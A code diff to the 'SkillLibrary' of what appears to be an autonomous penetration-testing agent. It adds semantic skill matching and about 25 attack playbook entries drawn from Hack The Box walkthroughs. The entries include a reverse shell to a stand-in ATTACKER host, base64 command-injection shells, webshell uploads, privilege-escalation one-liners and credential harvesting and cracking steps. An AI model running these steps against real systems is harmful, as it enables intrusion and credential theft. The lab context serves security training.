@@ -410,23 +410,90 @@ class SkillLibrary:
     
     def get_skills_for_condition(self, condition_keywords: List[str]) -> List[SkillCard]:
         """
-        Find skills matching condition keywords.
-        
+        Find skills matching condition keywords using semantic + keyword hybrid.
+
+        Phase 6.9.6: Uses SentenceTransformer cosine similarity when available,
+        falls back to keyword matching. Combines both scores for robust matching.
+
         Args:
             condition_keywords: Keywords to match in if_condition
-            
+
         Returns:
-            List of matching skills
+            List of matching skills, sorted by relevance score
         """
-        matches = []
+        if not self.skills:
+            return []
+
+        query_text = " ".join(condition_keywords).lower()
+        scored: List[Tuple[float, SkillCard]] = []
+
+        # --- Keyword matching (always available) ---
         for skill in self.skills.values():
             condition_lower = skill.if_condition.lower()
-            if any(kw.lower() in condition_lower for kw in condition_keywords):
-                matches.append(skill)
-        
-        # Sort by confidence
-        matches.sort(key=lambda s: s.confidence, reverse=True)
-        return matches
+            kw_hits = sum(1 for kw in condition_keywords if kw.lower() in condition_lower)
+            kw_score = kw_hits / max(len(condition_keywords), 1)
+
+            if kw_score > 0:
+                scored.append((kw_score, skill))
+
+        # --- Semantic matching (if SentenceTransformer available) ---
+        try:
+            if not hasattr(self, '_embedder'):
+                from sentence_transformers import SentenceTransformer
+                self._embedder = SentenceTransformer("sentence-transformers/all-MiniLM-L6-v2")
+                # Pre-compute skill embeddings (cached)
+                self._skill_embeddings: Dict[str, Any] = {}
+
+            if self._embedder is not None:
+                import numpy as np
+
+                # Embed query
+                query_emb = self._embedder.encode(query_text, normalize_embeddings=True)
+
+                # Embed skills (lazy, cached)
+                for sid, skill in self.skills.items():
+                    if sid not in self._skill_embeddings:
+                        self._skill_embeddings[sid] = self._embedder.encode(
+                            skill.if_condition, normalize_embeddings=True
+                        )
+
+                # Compute cosine similarities
+                semantic_scores: Dict[str, float] = {}
+                for sid, skill in self.skills.items():
+                    emb = self._skill_embeddings.get(sid)
+                    if emb is not None:
+                        sim = float(np.dot(query_emb, emb))
+                        if sim > 0.3:  # Minimum relevance threshold
+                            semantic_scores[sid] = sim
+
+                # Merge keyword + semantic scores
+                merged: Dict[str, Tuple[float, SkillCard]] = {}
+
+                # Add keyword matches
+                for score, skill in scored:
+                    merged[skill.id] = (score, skill)
+
+                # Add/boost with semantic matches
+                for sid, sem_score in semantic_scores.items():
+                    skill = self.skills[sid]
+                    if sid in merged:
+                        # Combine: 60% semantic + 40% keyword
+                        kw_s = merged[sid][0]
+                        combined = 0.4 * kw_s + 0.6 * sem_score
+                        merged[sid] = (combined, skill)
+                    else:
+                        merged[sid] = (sem_score * 0.6, skill)
+
+                scored = list(merged.values())
+
+        except ImportError:
+            logger.debug("SentenceTransformer not available, using keyword-only matching")
+        except Exception as e:
+            logger.debug(f"Semantic matching failed (non-fatal): {e}")
+
+        # Sort by score * confidence (relevance × reliability)
+        scored.sort(key=lambda x: x[0] * x[1].confidence, reverse=True)
+        return [skill for _, skill in scored]
     
     def get_top_skills(self, n: int = 10) -> List[SkillCard]:
         """Get top N skills by confidence."""
@@ -847,6 +914,176 @@ class SkillLibrary:
                 then_action="wpscan --enumerate ap → find vulnerable plugin → exploit OR login admin:admin → Appearance → Theme Editor → inject PHP reverse shell into 404.php. WHY: WordPress admin can edit theme files, injecting PHP code that executes on page load.",
                 confidence=0.86,
                 evidence_refs=["ms3_kill_chain_wordpress"],
+            ),
+            # ─── HTB Walkthrough-Derived Skills (Phase 7.0) ──────────
+            # Extracted from 15 HTB walkthroughs by Claude analysis
+            SkillCard(
+                id="htb_idor_sequential_ids",
+                if_condition="Web app uses sequential IDs in URL paths (e.g., /data/5, /user/3, /capture/1)",
+                then_action="Test IDOR by changing ID to 0 or other low values. Download any files found (especially .pcap captures). WHY: Sequential IDs mean no authorization check — any user's data is accessible by changing the number. ID=0 often has admin/initial data. Source: Cap walkthrough.",
+                confidence=0.95,
+                evidence_refs=["htb_cap_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_pcap_cleartext_creds",
+                if_condition="PCAP/network capture file obtained (from IDOR, file download, or share)",
+                then_action="tshark -r file.pcap -Y 'ftp.request.command == USER || ftp.request.command == PASS' OR open in Wireshark and filter for ftp/http/telnet. WHY: FTP/Telnet transmit credentials in cleartext. PCAP files are goldmines for credential harvesting. Source: Cap walkthrough.",
+                confidence=0.94,
+                evidence_refs=["htb_cap_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_linux_capabilities_privesc",
+                if_condition="Linux user shell AND getcap shows cap_setuid on python3 or perl",
+                then_action="python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' → instant root. WHY: cap_setuid allows the binary to change its UID. Python can call os.setuid(0) to become root, then spawn a root bash shell. Source: Cap walkthrough.",
+                confidence=0.97,
+                evidence_refs=["htb_cap_walkthrough", "CVE-none-capabilities"],
+            ),
+            SkillCard(
+                id="htb_ssrf_filtered_ports",
+                if_condition="Nmap shows filtered ports AND an SSRF-capable web app on an open port",
+                then_action="Configure SSRF proxy (e.g., Request Baskets forward_url=http://127.0.0.1:FILTERED_PORT) to reach internal services through the target. WHY: Filtered ports are reachable from localhost. SSRF lets us proxy through the target to reach internal-only services. Source: Sau walkthrough (CVE-2023-27163).",
+                confidence=0.93,
+                evidence_refs=["htb_sau_walkthrough", "CVE-2023-27163"],
+            ),
+            SkillCard(
+                id="htb_systemctl_pager_root",
+                if_condition="sudo -l shows NOPASSWD for systemctl",
+                then_action="sudo /usr/bin/systemctl status anything → when pager opens, type !sh → root shell. WHY: systemctl uses 'less' as its pager. In less, !command spawns a shell. Since systemctl runs as root via sudo, the spawned shell is root. Source: Sau walkthrough.",
+                confidence=0.96,
+                evidence_refs=["htb_sau_walkthrough", "gtfobins_systemctl"],
+            ),
+            SkillCard(
+                id="htb_ftp_webroot_overlap",
+                if_condition="FTP anonymous write enabled AND FTP root contains web server files (iisstart.htm, index.html)",
+                then_action="Generate webshell (msfvenom ASPX for IIS, PHP for Apache) → upload via FTP → trigger via HTTP. WHY: FTP root = web root means anything uploaded via FTP is accessible via the web server. Upload code = instant RCE. Source: Devel walkthrough.",
+                confidence=0.95,
+                evidence_refs=["htb_devel_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_windows_kernel_privesc",
+                if_condition="Windows shell obtained AND systeminfo shows old build (Win7 7600, Win2008, etc.)",
+                then_action="Use windows-exploit-suggester or search for specific kernel exploit. Win7 Build 7600 = MS11-046 (afd.sys). Compile/download exploit, transfer via certutil, execute for SYSTEM. Source: Devel walkthrough.",
+                confidence=0.92,
+                evidence_refs=["htb_devel_walkthrough", "MS11-046"],
+            ),
+            SkillCard(
+                id="htb_heartbleed_memory_leak",
+                if_condition="Port 443 open AND OpenSSL version is 1.0.1-1.0.1f",
+                then_action="nmap --script ssl-heartbleed -p 443 {target} → if vulnerable, run heartbleed exploit multiple times → search leaked memory for passwords, session tokens, base64 strings. WHY: Heartbleed leaks 64KB of server process memory per request. Multiple attempts leak different memory regions. Source: Valentine walkthrough.",
+                confidence=0.94,
+                evidence_refs=["htb_valentine_walkthrough", "CVE-2014-0160"],
+            ),
+            SkillCard(
+                id="htb_tmux_session_hijack",
+                if_condition="Linux user shell AND tmux/screen sessions running as root (found via find / -name '*tmux*' or tmux ls)",
+                then_action="tmux -S /path/to/root/socket attach → instant root. WHY: Tmux sessions persist and can be attached to by anyone with access to the socket file. Root sessions = instant root. Source: Valentine walkthrough.",
+                confidence=0.93,
+                evidence_refs=["htb_valentine_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_cron_script_replacement",
+                if_condition="Linux user shell AND writable script found in /scripts or /opt that runs as root cron",
+                then_action="Replace script content with: import os; os.system('bash -i >& /dev/tcp/ATTACKER/4444 0>&1') → wait for cron execution → root shell. WHY: Cron executes scripts at intervals. If the script is writable, replacing its content gives root on next execution. Source: Bashed walkthrough.",
+                confidence=0.94,
+                evidence_refs=["htb_bashed_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_webapp_config_cred_reuse",
+                if_condition="Web application shell (www-data) obtained",
+                then_action="cat config.php conf.php .env wp-config.php settings.py → extract DB credentials → try same password for SSH login. WHY: Developers reuse passwords across services. Web app DB password = SSH password is extremely common. Source: BoardLight, TwoMillion walkthroughs.",
+                confidence=0.95,
+                evidence_refs=["htb_boardlight_walkthrough", "htb_twomillion_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_subdomain_vhost_fuzzing",
+                if_condition="Web server returns hostname redirect OR only SSH+HTTP ports open with nothing on main page",
+                then_action="ffuf -u http://{target} -H 'Host: FUZZ.domain.htb' -w subdomains-top1million-5000.txt -fs DEFAULT → discover hidden applications on subdomains. WHY: Virtual hosting hides different apps on subdomains. The real attack surface is often on a subdomain, not the main domain. Source: BoardLight, Analytics walkthroughs.",
+                confidence=0.94,
+                evidence_refs=["htb_boardlight_walkthrough", "htb_analytics_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_env_var_cred_leak",
+                if_condition="Shell inside a Docker container or application sandbox",
+                then_action="env | grep -i 'pass\\|secret\\|key\\|token' → try leaked credentials for SSH to host. WHY: Containers receive secrets via environment variables. These often include host-level passwords. Source: Analytics walkthrough.",
+                confidence=0.93,
+                evidence_refs=["htb_analytics_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_overlayfs_kernel_privesc",
+                if_condition="Ubuntu 22.04 OR kernel 5.15-6.2 AND user shell obtained",
+                then_action="Run OverlayFS exploit (CVE-2023-2640/CVE-2023-32629): single-command unshare + overlay mount → root. WHY: Ubuntu 22.04 kernels have a specific OverlayFS bug allowing SUID bypass. Source: Analytics, TwoMillion walkthroughs.",
+                confidence=0.92,
+                evidence_refs=["htb_analytics_walkthrough", "htb_twomillion_walkthrough", "CVE-2023-2640"],
+            ),
+            SkillCard(
+                id="htb_api_command_injection",
+                if_condition="Web API endpoint that generates files or configs (VPN, reports, exports)",
+                then_action="Test parameter values with ;id; to check for command injection. If confirmed, inject reverse shell via base64: ;echo BASE64_SHELL | base64 -d | bash;. WHY: File generation APIs often pass parameters to system commands. Source: TwoMillion walkthrough.",
+                confidence=0.91,
+                evidence_refs=["htb_twomillion_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_shadow_backup_crack",
+                if_condition="Linux shell AND /backup/ directory exists OR find reveals shadow backup files",
+                then_action="cat /backup/shadow.backup → john --wordlist=rockyou.txt shadow_hashes → su with cracked password. WHY: Admins create shadow backups with weaker permissions. These contain crackable password hashes. Source: Sunday walkthrough.",
+                confidence=0.92,
+                evidence_refs=["htb_sunday_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_finger_enumeration",
+                if_condition="Port 79 (finger) open",
+                then_action="finger @{target} → enumerate users → finger username@{target} for details → hydra SSH brute force with discovered usernames. WHY: Finger reveals valid system usernames, eliminating half the brute force problem. Source: Sunday walkthrough.",
+                confidence=0.90,
+                evidence_refs=["htb_sunday_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_wget_sudo_privesc",
+                if_condition="sudo -l shows NOPASSWD for wget",
+                then_action="Use GTFOBins wget: sudo wget --use-askpass=/path/to/script http://attacker → root. WHY: wget's --use-askpass executes an arbitrary program to get proxy password, running it as root via sudo. Source: Sunday walkthrough.",
+                confidence=0.91,
+                evidence_refs=["htb_sunday_walkthrough", "gtfobins_wget"],
+            ),
+            SkillCard(
+                id="htb_db_file_hash_extraction",
+                if_condition="Application uses embedded database (Derby, H2, SQLite) AND user shell obtained",
+                then_action="find /opt -name '*.dat' -o -name '*.db' → grep for hash patterns (SHA1, MD5, bcrypt) → extract and crack with hashcat/john. WHY: Embedded DBs store hashes in raw data files, not just SQL tables. grep through .dat files. Source: Bizness walkthrough.",
+                confidence=0.89,
+                evidence_refs=["htb_bizness_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_ad_gpp_decrypt",
+                if_condition="Windows Active Directory target AND SMB Replication/SYSVOL share accessible",
+                then_action="Find Groups.xml → extract cPassword → gpp-decrypt → get service account creds → Kerberoast with GetUserSPNs.py. WHY: Microsoft published the AES key for GPP encryption. ALL GPP passwords are trivially decryptable. Source: Active walkthrough.",
+                confidence=0.94,
+                evidence_refs=["htb_active_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_default_creds_before_brute",
+                if_condition="CMS or admin panel login page found (Dolibarr, WordPress, OFBiz, Jenkins, etc.)",
+                then_action="ALWAYS try default credentials FIRST: admin:admin, admin:password, root:root, tomcat:tomcat. WHY: Default credentials are instant access. Brute force is slow, noisy, and may trigger lockout. Source: BoardLight (admin:admin on Dolibarr), Bizness (OFBiz defaults).",
+                confidence=0.96,
+                evidence_refs=["htb_boardlight_walkthrough", "htb_bizness_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_js2py_sandbox_escape",
+                if_condition="Flask web app using js2py to evaluate user JavaScript (check requirements.txt)",
+                then_action="Use CVE-2024-28397 payload to escape js2py sandbox → navigate Python MRO → find subprocess.Popen → execute commands. WHY: js2py ≤0.74 allows JavaScript to access Python internals via __class__.__base__.__subclasses__(). Source: CodePartTwo walkthrough.",
+                confidence=0.88,
+                evidence_refs=["htb_codeparttwo_walkthrough", "CVE-2024-28397"],
+            ),
+            SkillCard(
+                id="htb_sqlite_hash_dump",
+                if_condition="Application shell AND SQLite database found (*.db, *.sqlite3 files)",
+                then_action="sqlite3 database.db 'SELECT * FROM user' → extract password hashes → crack with CrackStation (MD5) or hashcat. WHY: Application databases contain user credentials. MD5 hashes crack instantly. Source: CodePartTwo walkthrough.",
+                confidence=0.91,
+                evidence_refs=["htb_codeparttwo_walkthrough"],
+            ),
+            SkillCard(
+                id="htb_backup_tool_abuse",
+                if_condition="sudo -l shows NOPASSWD for backup tool (npbackup-cli, restic, etc.) AND config file is modifiable",
+                then_action="Copy config, modify backup paths to target /root, run sudo backup-tool -c modified_config -b → restore to read root files. WHY: Backup tools with sudo can read any directory when given a custom config. Source: CodePartTwo walkthrough.",
+                confidence=0.88,
+                evidence_refs=["htb_codeparttwo_walkthrough"],
             ),
             SkillCard(
                 id="strategy_target_switching",
